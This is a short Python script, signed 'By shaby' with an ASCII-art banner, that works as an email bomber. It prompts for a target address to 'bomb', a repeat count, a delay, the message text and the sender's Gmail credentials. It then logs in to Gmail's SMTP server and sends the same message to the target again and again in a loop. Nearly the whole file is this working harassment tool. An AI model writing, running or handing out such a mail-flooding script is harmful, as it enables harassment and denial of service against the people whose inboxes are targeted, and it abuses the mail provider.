import smtplib as sl
import time
import os
f = True
logo = '''
░░░░░░░░░░░▄▄▄▄░░░░░░░░░░░░░░
░░░░░░░░░▄█████████▄▄▄░░░░░░░
░░░░░░░░▐███████████████▄▄░░░
░░░░░░░░███████████████████▄░
░░░░░░░█████████████████████▌
░░░░░░▐█▀▀▀▀██▀▒▒▒▒▒▒▒▒▒▀███░
░░░░░▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█░░
░░░░░▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌░░
░░░▄▀▀▀▀▄▒▒▒▒▒▀▀▀▄▄▒▒▒▒▒▒▒▐░░
░░▐▒▄▀▀▒▒▒▒▒▒▄▄▄▄▄▒▒▒▒▒▀▄▄▐░░
░░▐▒▒▒▀▒▒▒▒▒▒▒▌▀▒▌▒▒▒▀▄▄▄▒▐░░
░░░▀▄▒▄▒▒▒▒▒▒▒▒▀▀▒▒▒▌▒▌▀▐▒▌░░
░░░░▐▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▒▒▀▒▐░░░
░░░░▌▒▒▒▒▒▒▒▒▒▒▒▒▀▄▄▒▀▒▒▒▌░░░
░░░▐▒▒▒▒▒▒▒▒▒▒▄▄▄▄▒▒▒▒▒▒▐░░░░
░░▄▌▒▒▒▒▒▒▒▒▒▒▒██████▄▒▐░░░░░
░█▐▒▒▒▒▒▀▒▒▒▒▒▒▒▀▀██▀▒▐░░░░░░
▀▒▐▒▒▒▒▒▒▀▒▒▒▒▒▒▒▒▒▒▒▐░░▄▄░░░
░░░▐▒▒▒▒▒▒▒▀▄▒▒▒▒▒▒▒▐░░▐░░▐░░
░░░░▐▒▒▒▒▒▒▒▒▀▄▄▄▄▄▀░▄▄▐░░▐▄▄
░░░░░▐▒▒▒▒▒▒▒▒▒▌▌░░░▐░░▐░░▐░▐
░░░░░▐▒▒▒▒▒▒▒▐▐ ░░░░▐░░░░░░░░▐
                                                                                  
        By shaby                                               

'''
print(logo)
#phone = input()
def send_mail(gmail, text, snd_mail, snd_pass):
    server = sl.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(snd_mail, snd_pass)
    server.sendmail(snd_mail, gmail, text)
    server.quit()
if __name__ == '__main__':
    gmail = input('Enter to bomb: ')
    n = int(input('iteration: '))
    sleep_tim = int(input('ms: ' ))
    txt = input('msg txt:')
    mail_sender = input('enter sender mail: ')
    passw = input('Your password: ')
    print('ctrl z for stopp')
    try:
        for i in range(n):
            send_mail(gmail, txt, mail_sender, passw)
            time.sleep(sleep_tim)
            print('ok:', i + 1)
            if i == n-1:
                os.popen('clear')
                print('Finised')
                print('it count: ', i+1)
    except:
        print('check your inf')